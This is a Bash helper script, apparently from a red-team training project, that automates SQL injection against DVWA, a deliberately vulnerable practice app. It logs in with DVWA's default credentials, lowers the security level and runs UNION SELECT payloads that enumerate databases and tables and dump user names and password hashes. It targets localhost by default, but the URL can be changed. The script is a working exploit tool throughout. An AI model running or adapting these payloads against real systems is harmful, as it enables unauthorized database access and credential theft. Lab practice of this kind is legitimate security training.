#!/bin/bash
#
# dvwa-sqli-helper.sh - Helper para explotación manual de SQL Injection en DVWA
# Autor: PAI-5 RedTeamPro
#

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Variables
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
TARGET_URL="${TARGET_URL:-http://localhost}"
DVWA_SESSION=""
COOKIE_FILE="/tmp/dvwa_session_cookies.txt"

# Cargar utilidades
if [ -f "$SCRIPT_DIR/utils.sh" ]; then
    source "$SCRIPT_DIR/utils.sh"
else
    echo -e "${RED}[✗]${NC} No se encontró utils.sh"
    exit 1
fi

# ============================================================================
# FUNCIONES
# ============================================================================

# Obtener nueva sesión DVWA
get_fresh_session() {
    info "Obteniendo nueva sesión DVWA..."

    # Login
    local response=$(curl -s -c "$COOKIE_FILE" \
        -d "username=admin&password=password&Login=Login" \
        "$TARGET_URL/login.php" 2>&1)

    # Extraer PHPSESSID
    if [ -f "$COOKIE_FILE" ]; then
        DVWA_SESSION=$(grep PHPSESSID "$COOKIE_FILE" | awk '{print $7}')

        if [ -n "$DVWA_SESSION" ]; then
            log "Sesión obtenida: $DVWA_SESSION"

            # Configurar security level a low
            curl -s -b "PHPSESSID=$DVWA_SESSION" \
                -d "security=low&seclev_submit=Submit" \
                "$TARGET_URL/security.php" > /dev/null 2>&1

            log "Nivel de seguridad configurado a: low"

            # Verificar que funciona
            local test=$(curl -s -b "PHPSESSID=$DVWA_SESSION" \
                "$TARGET_URL/vulnerabilities/sqli/" | grep -i "user id")

            if [ -n "$test" ]; then
                echo ""
                success "✅ Sesión válida y autenticada"
                echo ""
                echo -e "${GREEN}Exporta esta variable:${NC}"
                echo -e "${BLUE}export DVWA_SESSION=\"$DVWA_SESSION\"${NC}"
                echo ""
                return 0
            else
                error "La sesión no pudo acceder a SQL Injection"
                return 1
            fi
        else
            error "No se pudo obtener PHPSESSID"
            return 1
        fi
    else
        error "No se creó el archivo de cookies"
        return 1
    fi
}

# Test básico de inyección
test_injection() {
    local session="$1"

    if [ -z "$session" ]; then
        error "Se requiere PHPSESSID"
        echo "Uso: $0 test <PHPSESSID>"
        return 1
    fi

    info "Probando SQL Injection básica..."

    # Test 1: id=1 (normal)
    echo ""
    echo -e "${BLUE}[TEST 1]${NC} Query normal: id=1"
    local url1="$TARGET_URL/vulnerabilities/sqli/?id=1&Submit=Submit"
    local result1=$(curl -s -b "PHPSESSID=$session" "$url1" | grep -i "surname" | head -1)

    if [ -n "$result1" ]; then
        echo -e "${GREEN}✓${NC} Respuesta obtenida"
    else
        echo -e "${RED}✗${NC} Sin respuesta (sesión inválida?)"
        return 1
    fi

    # Test 2: id=1' OR '1'='1 (inyección básica)
    echo ""
    echo -e "${BLUE}[TEST 2]${NC} SQL Injection: id=1' OR '1'='1"
    local url2="$TARGET_URL/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit"
    local result2=$(curl -s -b "PHPSESSID=$session" "$url2" | grep -i "surname")
    local count2=$(echo "$result2" | wc -l)

    if [ "$count2" -gt 1 ]; then
        echo -e "${GREEN}✓${NC} SQL Injection VULNERABLE! ($count2 registros)"
        echo -e "${GREEN}✓${NC} Se pueden extraer múltiples usuarios"
        return 0
    else
        echo -e "${YELLOW}⚠${NC} Posible protección o nivel de seguridad no es 'low'"
        return 1
    fi
}

# Enumerar bases de datos
enum_databases() {
    local session="$1"

    if [ -z "$session" ]; then
        error "Se requiere PHPSESSID"
        return 1
    fi

    info "Enumerando bases de datos..."

    # Payload: 1' UNION SELECT NULL,schema_name FROM information_schema.schemata-- -
    local payload="1%27%20UNION%20SELECT%20NULL%2Cschema_name%20FROM%20information_schema.schemata--%20-"
    local url="$TARGET_URL/vulnerabilities/sqli/?id=$payload&Submit=Submit"

    local result=$(curl -s -b "PHPSESSID=$session" "$url" | grep -oP '(?<=Surname: )[^<]+')

    if [ -n "$result" ]; then
        echo ""
        success "Bases de datos encontradas:"
        echo "$result" | while read -r db; do
            echo "  • $db"
        done
        echo ""
        return 0
    else
        error "No se pudieron enumerar bases de datos"
        return 1
    fi
}

# Enumerar tablas de dvwa
enum_tables() {
    local session="$1"

    if [ -z "$session" ]; then
        error "Se requiere PHPSESSID"
        return 1
    fi

    info "Enumerando tablas de la base de datos 'dvwa'..."

    # Payload: 1' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='dvwa'-- -
    local payload="1%27%20UNION%20SELECT%20NULL%2Ctable_name%20FROM%20information_schema.tables%20WHERE%20table_schema%3D%27dvwa%27--%20-"
    local url="$TARGET_URL/vulnerabilities/sqli/?id=$payload&Submit=Submit"

    local result=$(curl -s -b "PHPSESSID=$session" "$url" | grep -oP '(?<=Surname: )[^<]+')

    if [ -n "$result" ]; then
        echo ""
        success "Tablas encontradas en 'dvwa':"
        echo "$result" | while read -r table; do
            echo "  • $table"
        done
        echo ""
        return 0
    else
        error "No se pudieron enumerar tablas"
        return 1
    fi
}

# Extraer usuarios
dump_users() {
    local session="$1"

    if [ -z "$session" ]; then
        error "Se requiere PHPSESSID"
        return 1
    fi

    info "Extrayendo usuarios de la tabla 'users'..."

    # Payload: 1' UNION SELECT user,password FROM users-- -
    local payload="1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20-"
    local url="$TARGET_URL/vulnerabilities/sqli/?id=$payload&Submit=Submit"

    local result=$(curl -s -b "PHPSESSID=$session" "$url")

    # Parsear resultados
    echo ""
    success "Usuarios extraídos:"
    echo ""

    echo "$result" | grep -A1 "First name:" | while read -r line; do
        if echo "$line" | grep -q "First name:"; then
            user=$(echo "$line" | grep -oP '(?<=First name: )[^<]+')
            printf "  👤 Usuario: %-15s" "$user"
        elif echo "$line" | grep -q "Surname:"; then
            hash=$(echo "$line" | grep -oP '(?<=Surname: )[^<]+')
            echo "Hash: $hash"
        fi
    done

    echo ""
    return 0
}

# Explotación completa automatizada
full_exploit() {
    local session="$1"

    if [ -z "$session" ]; then
        error "Se requiere PHPSESSID"
        return 1
    fi

    show_banner "SQL Injection - Explotación Completa" "MITRE ATT&CK: T1213"

    echo ""
    separator
    echo -e "${BLUE}FASE 1: Test de vulnerabilidad${NC}"
    separator
    test_injection "$session"

    echo ""
    read -p "Presiona ENTER para continuar..."

    echo ""
    separator
    echo -e "${BLUE}FASE 2: Enumeración de bases de datos${NC}"
    separator
    enum_databases "$session"

    echo ""
    read -p "Presiona ENTER para continuar..."

    echo ""
    separator
    echo -e "${BLUE}FASE 3: Enumeración de tablas${NC}"
    separator
    enum_tables "$session"

    echo ""
    read -p "Presiona ENTER para continuar..."

    echo ""
    separator
    echo -e "${BLUE}FASE 4: Extracción de usuarios${NC}"
    separator
    dump_users "$session"

    echo ""
    separator
    success "Explotación completa finalizada"
    separator
    echo ""

    info "Captura evidencias con:"
    echo "  bash 07-Scripts/capture-evidence.sh --screenshot exploit sqli \"users-dump\" T1213"
    echo ""
}

# Mostrar ayuda
show_help() {
    cat << EOF
${BLUE}DVWA SQL Injection Helper${NC}

${GREEN}Uso:${NC}
  $0 <comando> [argumentos]

${GREEN}Comandos:${NC}
  ${YELLOW}session${NC}              Obtener nueva sesión DVWA
  ${YELLOW}test${NC} <PHPSESSID>     Test básico de SQL Injection
  ${YELLOW}databases${NC} <PHPSESSID> Enumerar bases de datos
  ${YELLOW}tables${NC} <PHPSESSID>    Enumerar tablas de 'dvwa'
  ${YELLOW}users${NC} <PHPSESSID>     Extraer usuarios y hashes
  ${YELLOW}exploit${NC} <PHPSESSID>   Explotación completa automatizada
  ${YELLOW}help${NC}                 Mostrar esta ayuda

${GREEN}Ejemplos:${NC}
  # Obtener sesión
  $0 session

  # Test de vulnerabilidad
  $0 test "tu-phpsessid"

  # Explotación completa
  $0 exploit "tu-phpsessid"

${GREEN}Workflow Recomendado:${NC}
  1. $0 session
  2. export DVWA_SESSION="<phpsessid-obtenida>"
  3. $0 exploit "\$DVWA_SESSION"
  4. bash 07-Scripts/capture-evidence.sh --screenshot exploit sqli "description" T1213

EOF
}

# ============================================================================
# MAIN
# ============================================================================

main() {
    local command="$1"
    local session="$2"

    case "$command" in
        session)
            get_fresh_session
            ;;
        test)
            test_injection "$session"
            ;;
        databases)
            enum_databases "$session"
            ;;
        tables)
            enum_tables "$session"
            ;;
        users)
            dump_users "$session"
            ;;
        exploit)
            full_exploit "$session"
            ;;
        help|--help|-h|"")
            show_help
            ;;
        *)
            error "Comando desconocido: $command"
            echo ""
            show_help
            exit 1
            ;;
    esac
}

# Ejecutar
if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main "$@"
fi
